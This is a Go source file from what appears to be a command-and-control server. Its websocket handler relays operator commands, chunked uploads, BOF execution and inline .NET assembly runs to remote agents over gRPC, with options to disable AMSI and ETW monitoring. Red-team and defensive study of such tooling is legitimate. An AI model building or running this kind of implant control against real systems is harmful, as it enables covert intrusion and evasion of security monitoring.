// internal/websocket/handlers/commands.go
package handlers

import (
	"c2/internal/websocket/hub"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"strings"
	"sync"
	"time"
)

// ChunkBuffer manages chunked command assembly
type ChunkBuffer struct {
	sync.RWMutex
	buffers map[string]*CommandBuffer // key: agentID-commandID
}

type CommandBuffer struct {
	Command     string
	AgentID     string
	CommandID   string
	FileName    string
	TotalChunks int
	Chunks      map[int]string // chunk number -> data
	ReceivedAt  time.Time
	LastUpdate  time.Time
	Processing  bool
	Forwarding  chan bool // Signal when ready to forward
	mu          sync.Mutex
	// Store original data for final assembly
	OriginalData map[string]interface{}
}

var chunkBuffer = &ChunkBuffer{
	buffers: make(map[string]*CommandBuffer),
}

// Cleanup goroutine for stale chunks
func init() {
	go func() {
		ticker := time.NewTicker(5 * time.Minute)
		defer ticker.Stop()

		for range ticker.C {
			chunkBuffer.Lock()
			now := time.Now()
			for key, buf := range chunkBuffer.buffers {
				if now.Sub(buf.LastUpdate) > 10*time.Minute {
					delete(chunkBuffer.buffers, key)
					log.Printf("Cleaned up stale chunk buffer: %s", key)
				}
			}
			chunkBuffer.Unlock()
		}
	}()
}

func (h *WSHandler) handleAgentCommand(client *hub.Client, message []byte) error {
	// Debug: Log first 500 chars of raw message
	if len(message) > 500 {
		log.Printf("DEBUG: Raw message (first 500 chars): %.500s", string(message))
	} else {
		log.Printf("DEBUG: Raw message: %s", string(message))
	}

	var msg struct {
		Type string `json:"type"`
		Data struct {
			Command      string `json:"command"`
			AgentID      string `json:"agent_id"`
			CommandID    string `json:"command_id"`
			FileName     string `json:"filename"`
			CurrentChunk int    `json:"currentChunk"`
			TotalChunks  int    `json:"totalChunks"`
			Data         string `json:"data"`
			Timestamp    string `json:"timestamp"`
			// BOF-specific fields
			Arch      string `json:"arch,omitempty"`
			FileSize  int    `json:"file_size,omitempty"`
			FileHash  string `json:"file_hash,omitempty"`
			Arguments string `json:"arguments,omitempty"`
			BOFName   string `json:"bof_name,omitempty"`
			JobID     string `json:"job_id,omitempty"`
			// Inline-assembly specific fields
			AssemblyB64  string   `json:"assembly_b64,omitempty"`
			ArgumentList []string `json:"arguments_list,omitempty"`
			AppDomain    string   `json:"app_domain,omitempty"`
			DisableAMSI  bool     `json:"disable_amsi,omitempty"`
			DisableETW   bool     `json:"disable_etw,omitempty"`
			RevertETW    bool     `json:"revert_etw,omitempty"`
			EntryPoint   string   `json:"entry_point,omitempty"`
		} `json:"data"`
	}

	if err := json.Unmarshal(message, &msg); err != nil {
		log.Printf("Failed to unmarshal agent_command message: %v", err)
		return sendErrorResponse(client, "Failed to parse incoming message", msg.Data.Command, msg.Data.CommandID)
	}

	// Add debug logging here
	if strings.HasPrefix(msg.Data.Command, "inline-assembly") {
		log.Printf("DEBUG: inline-assembly data.Data length: %d", len(msg.Data.Data))
		if len(msg.Data.Data) > 0 {
			log.Printf("DEBUG: First 100 chars of data.Data: %.100s", msg.Data.Data)
		} else {
			log.Printf("DEBUG: data.Data is empty!")
		}
	}

	log.Printf("Received agent_command: Command=%s, Agent=%s, Chunk=%d/%d",
		msg.Data.Command, msg.Data.AgentID, msg.Data.CurrentChunk, msg.Data.TotalChunks)

	// Check if this is a chunked command
	if msg.Data.TotalChunks > 1 {
		// Process chunk in a goroutine to avoid blocking
		go func() {
			// Forward chunk IMMEDIATELY to agent service
			h.forwardChunkToAgent(client, msg.Data)

			// Track chunk for assembly (but don't block on it)
			h.trackChunk(client, msg.Data)

			// Send acknowledgment to client
			h.sendChunkAck(client, msg.Data.CurrentChunk, msg.Data.TotalChunks, msg.Data.FileName)

			// Broadcast progress to all clients
			h.broadcastChunkProgress(msg.Data.AgentID, msg.Data.CommandID, msg.Data.FileName,
				msg.Data.CurrentChunk+1, msg.Data.TotalChunks)
		}()

		return nil // Return immediately, don't block
	}

	// For non-chunked commands, process asynchronously
	go h.processSingleCommand(client, msg.Data)

	return nil
}

// New function to forward chunks immediately to agent
func (h *WSHandler) forwardChunkToAgent(client *hub.Client, data struct {
	Command      string   `json:"command"`
	AgentID      string   `json:"agent_id"`
	CommandID    string   `json:"command_id"`
	FileName     string   `json:"filename"`
	CurrentChunk int      `json:"currentChunk"`
	TotalChunks  int      `json:"totalChunks"`
	Data         string   `json:"data"`
	Timestamp    string   `json:"timestamp"`
	Arch         string   `json:"arch,omitempty"`
	FileSize     int      `json:"file_size,omitempty"`
	FileHash     string   `json:"file_hash,omitempty"`
	Arguments    string   `json:"arguments,omitempty"`
	BOFName      string   `json:"bof_name,omitempty"`
	JobID        string   `json:"job_id,omitempty"`
	AssemblyB64  string   `json:"assembly_b64,omitempty"`
	ArgumentList []string `json:"arguments_list,omitempty"`
	AppDomain    string   `json:"app_domain,omitempty"`
	DisableAMSI  bool     `json:"disable_amsi,omitempty"`
	DisableETW   bool     `json:"disable_etw,omitempty"`
	RevertETW    bool     `json:"revert_etw,omitempty"`
	EntryPoint   string   `json:"entry_point,omitempty"`
}) {
	// Prepare chunk data for agent
	var chunkData string

	// For the first chunk of BOF commands, include metadata
	if data.CurrentChunk == 0 && strings.HasPrefix(data.Command, "bof") {
		bofMeta := map[string]interface{}{
			"chunk_data": data.Data,
			"arch":       data.Arch,
			"file_size":  data.FileSize,
			"file_hash":  data.FileHash,
			"arguments":  data.Arguments,
			"bof_name":   data.BOFName,
			"async":      strings.Contains(data.Command, "async"),
		}
		if jsonData, err := json.Marshal(bofMeta); err == nil {
			chunkData = string(jsonData)
		} else {
			chunkData = data.Data
		}
	} else {
		// For other chunks, just send the data
		chunkData = data.Data
	}

	// Forward to agent immediately
	payload := map[string]interface{}{
		"command":      data.Command,
		"agent_id":     data.AgentID,
		"command_id":   data.CommandID,
		"filename":     data.FileName,
		"currentChunk": data.CurrentChunk,
		"totalChunks":  data.TotalChunks,
		"data":         chunkData,
		"timestamp":    data.Timestamp,
		"username":     client.Username,
	}

	// Send to agent service without waiting
	go func() {
		if h.agentClient == nil {
			log.Println("gRPC client not connected")
			return
		}

		if err := h.agentClient.SendToStream("agent_command", payload); err != nil {
			log.Printf("Failed to forward chunk %d/%d to agent: %v",
				data.CurrentChunk+1, data.TotalChunks, err)
		} else {
			log.Printf("Forwarded chunk %d/%d to agent for %s",
				data.CurrentChunk+1, data.TotalChunks, data.FileName)
		}
	}()
}

// Track chunks for potential reassembly (but don't block on it)
func (h *WSHandler) trackChunk(client *hub.Client, data struct {
	Command      string   `json:"command"`
	AgentID      string   `json:"agent_id"`
	CommandID    string   `json:"command_id"`
	FileName     string   `json:"filename"`
	CurrentChunk int      `json:"currentChunk"`
	TotalChunks  int      `json:"totalChunks"`
	Data         string   `json:"data"`
	Timestamp    string   `json:"timestamp"`
	Arch         string   `json:"arch,omitempty"`
	FileSize     int      `json:"file_size,omitempty"`
	FileHash     string   `json:"file_hash,omitempty"`
	Arguments    string   `json:"arguments,omitempty"`
	BOFName      string   `json:"bof_name,omitempty"`
	JobID        string   `json:"job_id,omitempty"`
	AssemblyB64  string   `json:"assembly_b64,omitempty"`
	ArgumentList []string `json:"arguments_list,omitempty"`
	AppDomain    string   `json:"app_domain,omitempty"`
	DisableAMSI  bool     `json:"disable_amsi,omitempty"`
	DisableETW   bool     `json:"disable_etw,omitempty"`
	RevertETW    bool     `json:"revert_etw,omitempty"`
	EntryPoint   string   `json:"entry_point,omitempty"`
}) {
	bufferKey := fmt.Sprintf("%s-%s", data.AgentID, data.CommandID)

	chunkBuffer.Lock()
	cmdBuffer, exists := chunkBuffer.buffers[bufferKey]
	if !exists {
		cmdBuffer = &CommandBuffer{
			Command:      data.Command,
			AgentID:      data.AgentID,
			CommandID:    data.CommandID,
			FileName:     data.FileName,
			TotalChunks:  data.TotalChunks,
			Chunks:       make(map[int]string),
			ReceivedAt:   time.Now(),
			LastUpdate:   time.Now(),
			Processing:   false,
			Forwarding:   make(chan bool, 1),
			OriginalData: make(map[string]interface{}),
		}
		// Store original data for potential reassembly
		cmdBuffer.OriginalData["arch"] = data.Arch
		cmdBuffer.OriginalData["file_size"] = data.FileSize
		cmdBuffer.OriginalData["file_hash"] = data.FileHash
		cmdBuffer.OriginalData["arguments"] = data.Arguments
		cmdBuffer.OriginalData["timestamp"] = data.Timestamp

		chunkBuffer.buffers[bufferKey] = cmdBuffer
	}
	chunkBuffer.Unlock()

	// Store chunk data
	cmdBuffer.mu.Lock()
	cmdBuffer.Chunks[data.CurrentChunk] = data.Data
	cmdBuffer.LastUpdate = time.Now()
	receivedCount := len(cmdBuffer.Chunks)
	isComplete := receivedCount == cmdBuffer.TotalChunks
	cmdBuffer.mu.Unlock()

	// If all chunks received, send completion notification
	if isComplete {
		h.sendCompletionMessage(client, cmdBuffer)

		// Clean up buffer after a delay
		go func() {
			time.Sleep(30 * time.Second)
			chunkBuffer.Lock()
			delete(chunkBuffer.buffers, bufferKey)
			chunkBuffer.Unlock()
		}()
	}
}

func (h *WSHandler) processSingleCommand(client *hub.Client, data struct {
	Command      string   `json:"command"`
	AgentID      string   `json:"agent_id"`
	CommandID    string   `json:"command_id"`
	FileName     string   `json:"filename"`
	CurrentChunk int      `json:"currentChunk"`
	TotalChunks  int      `json:"totalChunks"`
	Data         string   `json:"data"`
	Timestamp    string   `json:"timestamp"`
	Arch         string   `json:"arch,omitempty"`
	FileSize     int      `json:"file_size,omitempty"`
	FileHash     string   `json:"file_hash,omitempty"`
	Arguments    string   `json:"arguments,omitempty"`
	BOFName      string   `json:"bof_name,omitempty"`
	JobID        string   `json:"job_id,omitempty"`
	AssemblyB64  string   `json:"assembly_b64,omitempty"`
	ArgumentList []string `json:"arguments_list,omitempty"`
	AppDomain    string   `json:"app_domain,omitempty"`
	DisableAMSI  bool     `json:"disable_amsi,omitempty"`
	DisableETW   bool     `json:"disable_etw,omitempty"`
	RevertETW    bool     `json:"revert_etw,omitempty"`
	EntryPoint   string   `json:"entry_point,omitempty"`
}) {
	// Ensure gRPC connection
	if h.agentClient == nil {
		log.Println("gRPC client not connected, attempting to reconnect...")
		if err := h.ensureGRPCConnection(); err != nil {
			log.Printf("Failed to reconnect gRPC client: %v", err)
			sendErrorResponse(client, "Failed to connect to gRPC service", data.Command, data.CommandID)
			return
		}
	}

	// Handle inline-assembly command
	if strings.HasPrefix(data.Command, "inline-assembly") {
		log.Printf("Processing inline-assembly command for agent: %s", data.AgentID)

		// The assembly data is in AssemblyB64, not Data
		if data.AssemblyB64 != "" {
			// Build the JSON for the payload
			inlineAssemblyData := map[string]interface{}{
				"assembly_b64": data.AssemblyB64, // This now has the actual data!
				"arguments":    data.ArgumentList,
				"app_domain":   data.AppDomain,
				"disable_amsi": data.DisableAMSI,
				"disable_etw":  data.DisableETW,
				"revert_etw":   data.RevertETW,
				"entry_point":  data.EntryPoint,
				"async":        strings.Contains(data.Command, "async"),
			}

			if inlineAssemblyJSON, err := json.Marshal(inlineAssemblyData); err == nil {
				data.Data = string(inlineAssemblyJSON)
				log.Printf("Built inline-assembly JSON data (%d bytes)", len(data.Data))
			}
		} else {
			log.Printf("WARNING: No assembly data found in AssemblyB64 field")
		}
	}

	// Handle clear command
	if data.Command == "clear" {
		payload := map[string]interface{}{
			"command":    "clear",
			"agent_id":   data.AgentID,
			"command_id": data.CommandID,
			"timestamp":  data.Timestamp,
			"username":   client.Username,
		}

		if err := h.agentClient.SendToStream("agent_command", payload); err != nil {
			log.Printf("Failed to send clear command: %v", err)
			sendErrorResponse(client, "Failed to send clear command", data.Command, data.CommandID)
			return
		}

		h.sendSuccessMessage(client, "Clear command sent", data)
		return
	}

	// Send regular command
	payload := map[string]interface{}{
		"command":      data.Command,
		"agent_id":     data.AgentID,
		"command_id":   data.CommandID,
		"filename":     data.FileName,
		"currentChunk": data.CurrentChunk,
		"totalChunks":  data.TotalChunks,
		"data":         data.Data,
		"timestamp":    data.Timestamp,
		"username":     client.Username,
	}

	if err := h.agentClient.SendToStream("agent_command", payload); err != nil {
		log.Printf("Failed to send command: %v", err)
		sendErrorResponse(client, "Failed to send command", data.Command, data.CommandID)
		return
	}

	h.sendSuccessMessage(client, "Command sent successfully", data)
}

// Helper functions for sending responses
func (h *WSHandler) sendChunkAck(client *hub.Client, currentChunk, totalChunks int, fileName string) {
	response := Response{
		Type:    "chunk_received",
		Status:  "success",
		Message: fmt.Sprintf("Chunk %d/%d received and forwarded", currentChunk+1, totalChunks),
		Data: map[string]interface{}{
			"current_chunk": currentChunk + 1,
			"total_chunks":  totalChunks,
			"filename":      fileName,
		},
	}

	if responseJSON, err := json.Marshal(response); err == nil {
		// Don't block on send
		go func() {
			select {
			case client.Send <- responseJSON:
			case <-time.After(100 * time.Millisecond):
				log.Printf("Client send buffer full, skipping chunk ack")
			}
		}()
	}
}

func (h *WSHandler) broadcastChunkProgress(agentID, commandID, fileName string, current, total int) {
	progressMsg := struct {
		Type string `json:"type"`
		Data struct {
			AgentID      string  `json:"agent_id"`
			CommandID    string  `json:"command_id"`
			FileName     string  `json:"filename"`
			CurrentChunk int     `json:"current_chunk"`
			TotalChunks  int     `json:"total_chunks"`
			Progress     float64 `json:"progress"`
		} `json:"data"`
	}{
		Type: "chunk_progress",
	}

	progressMsg.Data.AgentID = agentID
	progressMsg.Data.CommandID = commandID
	progressMsg.Data.FileName = fileName
	progressMsg.Data.CurrentChunk = current
	progressMsg.Data.TotalChunks = total
	progressMsg.Data.Progress = float64(current) / float64(total) * 100

	if msgJSON, err := json.Marshal(progressMsg); err == nil {
		// Broadcast asynchronously
		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
			defer cancel()

			if err := h.hub.BroadcastToAll(ctx, msgJSON); err != nil {
				log.Printf("Failed to broadcast chunk progress: %v", err)
			}
		}()
	}
}

func (h *WSHandler) sendCompletionMessage(client *hub.Client, cmdBuffer *CommandBuffer) {
	response := Response{
		Type:   "command_assembled",
		Status: "success",
		Message: fmt.Sprintf("All %d chunks received and forwarded for %s",
			cmdBuffer.TotalChunks, cmdBuffer.FileName),
		Data: map[string]interface{}{
			"command_id":   cmdBuffer.CommandID,
			"agent_id":     cmdBuffer.AgentID,
			"filename":     cmdBuffer.FileName,
			"total_chunks": cmdBuffer.TotalChunks,
			"duration":     time.Since(cmdBuffer.ReceivedAt).Seconds(),
		},
	}

	if responseJSON, err := json.Marshal(response); err == nil {
		// Don't block on send
		go func() {
			select {
			case client.Send <- responseJSON:
			case <-time.After(100 * time.Millisecond):
				log.Printf("Client send buffer full, skipping completion message")
			}
		}()
	}
}

// Update for server/internal/websocket/handlers/commands.go

// Modified sendSuccessMessage function to broadcast command queue updates to all clients
func (h *WSHandler) sendSuccessMessage(client *hub.Client, message string, data struct {
	Command      string   `json:"command"`
	AgentID      string   `json:"agent_id"`
	CommandID    string   `json:"command_id"`
	FileName     string   `json:"filename"`
	CurrentChunk int      `json:"currentChunk"`
	TotalChunks  int      `json:"totalChunks"`
	Data         string   `json:"data"`
	Timestamp    string   `json:"timestamp"`
	Arch         string   `json:"arch,omitempty"`
	FileSize     int      `json:"file_size,omitempty"`
	FileHash     string   `json:"file_hash,omitempty"`
	Arguments    string   `json:"arguments,omitempty"`
	BOFName      string   `json:"bof_name,omitempty"`
	JobID        string   `json:"job_id,omitempty"`
	AssemblyB64  string   `json:"assembly_b64,omitempty"`
	ArgumentList []string `json:"arguments_list,omitempty"`
	AppDomain    string   `json:"app_domain,omitempty"`
	DisableAMSI  bool     `json:"disable_amsi,omitempty"`
	DisableETW   bool     `json:"disable_etw,omitempty"`
	RevertETW    bool     `json:"revert_etw,omitempty"`
	EntryPoint   string   `json:"entry_point,omitempty"`
}) {
	// First, send success message to the requesting client
	response := Response{
		Type:    "command_success",
		Status:  "success",
		Message: message,
		Data: map[string]interface{}{
			"command_id": data.CommandID,
			"agent_id":   data.AgentID,
			"command":    data.Command,
			"filename":   data.FileName,
		},
	}

	if responseJSON, err := json.Marshal(response); err == nil {
		select {
		case client.Send <- responseJSON:
		case <-time.After(100 * time.Millisecond):
			log.Printf("Client send buffer full, skipping success message")
		}
	}

	// Now broadcast the command queue update to ALL connected clients
	// This ensures all clients see the queued command in their agent buffers
	broadcastMsg := struct {
		Type string `json:"type"`
		Data struct {
			AgentID      string `json:"agent_id"`
			CommandID    string `json:"command_id"`
			Command      string `json:"command"`
			Username     string `json:"username"`
			Timestamp    string `json:"timestamp"`
			Status       string `json:"status"`
			FileName     string `json:"filename,omitempty"`
			CurrentChunk int    `json:"currentChunk,omitempty"`
			TotalChunks  int    `json:"totalChunks,omitempty"`
		} `json:"data"`
	}{
		Type: "command_queued",
	}

	broadcastMsg.Data.AgentID = data.AgentID
	broadcastMsg.Data.CommandID = data.CommandID
	broadcastMsg.Data.Command = data.Command
	broadcastMsg.Data.Username = client.Username
	broadcastMsg.Data.Timestamp = data.Timestamp
	broadcastMsg.Data.Status = "queued"
	broadcastMsg.Data.FileName = data.FileName
	broadcastMsg.Data.CurrentChunk = data.CurrentChunk
	broadcastMsg.Data.TotalChunks = data.TotalChunks

	if broadcastJSON, err := json.Marshal(broadcastMsg); err == nil {
		// Use goroutine to prevent blocking
		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
			defer cancel()

			if err := h.hub.BroadcastToAll(ctx, broadcastJSON); err != nil {
				log.Printf("Failed to broadcast command queue update: %v", err)
			} else {
				log.Printf("Successfully broadcast command queue update for agent %s", data.AgentID)
			}
		}()
	}
}

// You may also want to add a similar broadcast when chunks are being processed
func (h *WSHandler) broadcastCommandProgress(data struct {
	Command      string `json:"command"`
	AgentID      string `json:"agent_id"`
	CommandID    string `json:"command_id"`
	FileName     string `json:"filename"`
	CurrentChunk int    `json:"currentChunk"`
	TotalChunks  int    `json:"totalChunks"`
	Data         string `json:"data"`
	Timestamp    string `json:"timestamp"`
}) {
	progressMsg := struct {
		Type string `json:"type"`
		Data struct {
			AgentID      string  `json:"agent_id"`
			CommandID    string  `json:"command_id"`
			Command      string  `json:"command"`
			FileName     string  `json:"filename"`
			CurrentChunk int     `json:"current_chunk"`
			TotalChunks  int     `json:"total_chunks"`
			Progress     float64 `json:"progress"`
			Status       string  `json:"status"`
		} `json:"data"`
	}{
		Type: "command_progress",
	}

	progressMsg.Data.AgentID = data.AgentID
	progressMsg.Data.CommandID = data.CommandID
	progressMsg.Data.Command = data.Command
	progressMsg.Data.FileName = data.FileName
	progressMsg.Data.CurrentChunk = data.CurrentChunk
	progressMsg.Data.TotalChunks = data.TotalChunks
	progressMsg.Data.Progress = float64(data.CurrentChunk) / float64(data.TotalChunks) * 100
	progressMsg.Data.Status = "processing"

	if msgJSON, err := json.Marshal(progressMsg); err == nil {
		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
			defer cancel()

			if err := h.hub.BroadcastToAll(ctx, msgJSON); err != nil {
				log.Printf("Failed to broadcast command progress: %v", err)
			}
		}()
	}
}

func sendErrorResponse(client *hub.Client, errorMsg, command, commandID string) error {
	responseMsg := Response{
		Type:    "command_validation",
		Status:  "error",
		Message: errorMsg,
		Data: map[string]string{
			"command_id": commandID,
			"command":    command,
			"timestamp":  getCurrentTimestamp(),
			"username":   client.Username,
		},
	}

	// Don't block on send
	go func() {
		responseJSON := marshalResponse(responseMsg)
		select {
		case client.Send <- responseJSON:
		case <-time.After(100 * time.Millisecond):
			log.Printf("Client send buffer full, skipping error message")
		}
	}()

	return nil
}

func getCurrentTimestamp() string {
	return time.Now().Format(time.RFC3339)
}

func marshalResponse(resp Response) []byte {
	jsonResp, err := json.Marshal(resp)
	if err != nil {
		log.Printf("Failed to marshal response: %v", err)
		return []byte(`{"status": "error", "message": "Failed to generate response"}`)
	}
	return jsonResp
}
